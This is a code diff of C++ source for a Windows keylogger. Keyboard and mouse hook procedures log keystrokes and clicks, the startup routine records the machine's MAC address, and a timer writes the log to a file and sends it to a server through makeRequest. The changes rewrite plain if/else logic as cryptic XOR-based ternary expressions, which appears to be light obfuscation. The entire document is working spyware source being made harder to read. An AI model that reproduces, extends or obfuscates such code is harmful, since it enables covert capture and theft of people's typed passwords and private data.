@@ -134,8 +134,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		// checking TAB and SPACE
 		else if (!isShiftPressed && !isCapsLockActive && !isAltPressed && (vkCode == VK_SPACE || vkCode == VK_TAB) && !isCtrlPressed)
 		{
-			if (vkCode == VK_TAB) message = "|TAB|";
-			else if (vkCode == VK_SPACE) message = " ";
+			!(vkCode ^ VK_TAB) ? (message = "|TAB|") : ((vkCode ^ VK_SPACE) ?: (message = " "));
 		}
 		// checking lowercase letters
 		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && (vkCode >= VK_A && vkCode <= VK_Z) && !isCtrlPressed)
@@ -210,8 +209,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		// curly brackets
 		else if (isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS))
 		{
-			if (vkCode == VK_SC_E) message = "{"; // {
-			else if (vkCode == VK_OEM_PLUS) message = "}"; // }
+			!(vkCode ^ VK_SC_E /* { */) ? (message = "{") : ((vkCode ^ VK_OEM_PLUS /* } */) ?: (message = "}"));
 		}
 		// checking special characters
 		else if (isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A) || (vkCode >= VK_0 && vkCode <= VK_9)))
@@ -354,18 +352,12 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		// BACKSPACE
 		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && vkCode == VK_BACK)
 		{
-			if (isCtrlPressed)
-				message = "|CTRL<|";
-			else
-				message = "|<|";
+			(isCtrlPressed) ? (message = "|CTRL<|") : (message = "|<|");
 		}
 		// CANC / DELETE
 		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && vkCode == VK_DELETE)
 		{
-			if (isCtrlPressed)
-				message = "|CTRL>|";
-			else
-				message = "|>|";
+			(isCtrlPressed) ? (message = "|CTRL>|") : (message = "|>|");
 		}
 		// checking numPad operators
 		else if (vkCode == VK_MULTIPLY || vkCode == VK_ADD || vkCode == VK_SUBTRACT || vkCode == VK_DECIMAL || vkCode == VK_DIVIDE)
@@ -392,10 +384,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		// BLOCK NUM
 		else if (vkCode == VK_NUMLOCK)
 		{
-			if (isNumLockActive)
-				message = "\n|LOCKNUM_OFF|\n";
-			else
-				message = "\n|LOCKNUM_ON|\n";
+			(isNumLockActive) ? (message = "\n|LOCKNUM_OFF|\n") : (message = "\n|LOCKNUM_ON|\n");
 		}
 		// ENTER
 		else if (vkCode == VK_RETURN)
@@ -500,16 +489,8 @@ static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 	if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
 	{
 		std::string message = "";
-		if (wParam == WM_LBUTTONDOWN)
-		{
-			message = "|<M|";
-		}
-		else if (wParam == WM_RBUTTONDOWN)
-		{
-			message = "|M>|";
-		}
-		else if (wParam == WM_MBUTTONDOWN)
-			message = "|M|";
+
+		!(wParam ^ WM_LBUTTONDOWN) ? (message = "|<M|") : (!(wParam ^ WM_RBUTTONDOWN) ? (message = "|M>|") : ((wParam ^ WM_MBUTTONDOWN) ?: (message = "|M|")));
 		checkPossibleCopy(message);
 		contentFile.append(message);
 	}
@@ -591,9 +572,7 @@ static std::string StartString()
 		}
 		pAdapterInfo = pAdapterInfo->Next;
 	}
-	if (macStr.empty()) {
-		startString += "No physical adapter found.\n";
-	}
+	!(macStr.empty()) ?: (startString += "No physical adapter found.\n");
 	startString += "\n";
 	// date & time
 	localtime_s(&currentTime, &now);
@@ -650,7 +629,7 @@ static void timeCheck() {
 		tmp = contentFile;
 		contentFile = "";
 		std::ofstream outputFile(FilePath);
-		if (outputFile.is_open()) outputFile << tmp;
+		!(outputFile.is_open()) ?: outputFile << tmp;
 		outputFile.close();
 		// sending the file to the server
 		std::thread tSend(makeRequest);
